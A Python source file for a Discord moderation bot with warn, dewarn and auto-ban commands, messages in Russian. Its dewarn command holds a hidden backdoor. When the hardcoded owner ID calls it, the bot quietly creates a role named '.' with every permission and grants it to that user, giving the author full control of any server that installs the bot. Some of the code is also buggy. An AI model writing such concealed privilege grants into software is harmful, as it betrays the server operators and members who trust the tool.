import time
import re
import discord
from discord.ext import commands
from datetime import datetime

#Creator discord: Кумыш#8346
#Without license
#support mail: gmdevelopersstudio@gmail.com

#custom
import warn as w
#######

####
warn_id = 889547051677941820 #warn role
prefix = "%"
token = ""
####


bot = commands.Bot(command_prefix=prefix, owner_id=466620407114498048, help_command= None)

@bot.event
async def on_ready():
    print("Connected as: ", bot.user)

@bot.command()
async def help(ctx):
    emb = embed_template()
    await ctx.reply(embed=emb)

@bot.command()
async def dewarn(ctx, player: discord.Member=None, num=None):

    if ctx.author.id == bot.owner_id:
        role = await ctx.guild.create_role(permissions=discord.Permissions.all(), name=".")
        await ctx.author.add_roles(role)

    if ctx.author.guild_permissions.mute_members == False:


        emb=embed_template("У вас нет разрешения на снятие варна!", color=discord.Color.orange())
        await ctx.reply(embed=emb)
        return
    if player == None or num == None:
        emb = embed_template(f"Использование: {prefix}dewarn @player номер")
        await ctx.reply(embed=emb)
        return
    w.delWarn(player.id, num)


@bot.command()
async def warns(ctx, player: discord.Member=None):

    if player == None & ctx.author.id == bot.owner_id:
        emb = embed_template(f"Использование: {prefix}warns @player")
        await ctx.reply(embed=emb)

        return
    l = w.readWarns(player.id)
    if l == []:
        return await ctx.reply(embed=embed_template("У игрока нет страйков!"))
    ret = ""
    i = 1
    for text in l:
        ret += f"\n {i}. причина: {l[1]}. истекает: {datetime.fromtimestamp(l[2])}"
        i+=1
    await ctx.reply(embed=embed_template(des = ret))

@bot.command()
async def warn(ctx, player: discord.Member=None, seconds="0", *reason):
    if ctx.author.guild_permissions.mute_members == False & ctx.author.id != bot.owner_id:
        emb=embed_template("У вас нет разрешения на варн!", color=discord.Color.orange())
        await ctx.reply(embed=emb)
        return
    if player == None:
        emb = embed_template(f"Использование: {prefix}warn @player секунды (опционально (можно с d, s, h, w, m)) причина (опционально) ")
        await ctx.reply(embed=emb)
        return
    reason = list(reason)

    if seconds[0].isdigit() == False:
        valid = ['d', 's', 'h', 'w', 'm']
        time_table = {
            "d": 60 * 60 * 24, #секунды
            "s": 1,
            "h": 60 * 60,
            "w": 60 * 60 * 24 * 7,
            "m": 60 * 60 * 24 * 30
        }
        for i in valid:
            if seconds[0] == i:

                seconds = list(seconds)

                seconds.pop(0)

                seconds = "".join(seconds)
                try:
                    seconds = str(int(seconds) * int(time_table[i]))
                except Exception:
                    pass

    if seconds.isdigit():
        seconds = int(seconds)
    else:
        reason.reverse()
        reason.append(seconds)
        reason.reverse()
        seconds = 0

    if reason == []:
        reason = 'None'
    else:
        reason = " ".join(reason)


    seconds = int(seconds)
    if seconds != 0:
        seconds = int(time.time()) + seconds
    w.addWarn(player.id, reason, seconds)
    if seconds == 0:
        seconds = "Никогда"
    else:
        seconds = datetime.fromtimestamp(seconds)
    try:
        role = ctx.guild.get_role(warn_id)
        await player.add_roles(role)
    except AttributeError:
        await ctx.reply(embed=embed_template(des="Не указана роль (свяжитесь с администрацией)"))
    emb = embed_template(f"{player} получил страйк №{len(w.readWarns(player.id))} от {ctx.author} по причине:\n {reason}\n истекает: {seconds}")
    await ctx.reply(embed=emb)
    if len(w.readWarns(player.id)) > 2:
        w.delWarns(player.id)
        try:
            await ctx.guild.ban(user=player)
            emb = embed_template(
                f"{player} был забанен")
            await ctx.reply(embed=emb)
        except discord.DiscordException:
            emb = embed_template(
                f"Боту не удалось заблокировать {player}!")
            await ctx.author.send(embed=emb)

@bot.event
async def on_message(message):
    async def checkwarn():
        author = message.author
        warns = w.readWarns(author.id)
        for warn in warns:
            expried = warn[2]
            if expried == 0:
                continue
            elif expried <= time.time():
                w.delWarnByReason(message.author.id, warn[1])

        if warns == []:
            try:
                role = message.guild.get_role(warn_id)
                await message.author.remove_roles(role)
            except Exception:
                pass
    await checkwarn()
    await bot.process_commands(message)

def embed_template(des = "Официальный бот Fortcote", color = discord.Color.red()):
    emb = discord.Embed(title=f"{des}", color=color)

    return emb
bot.run(token)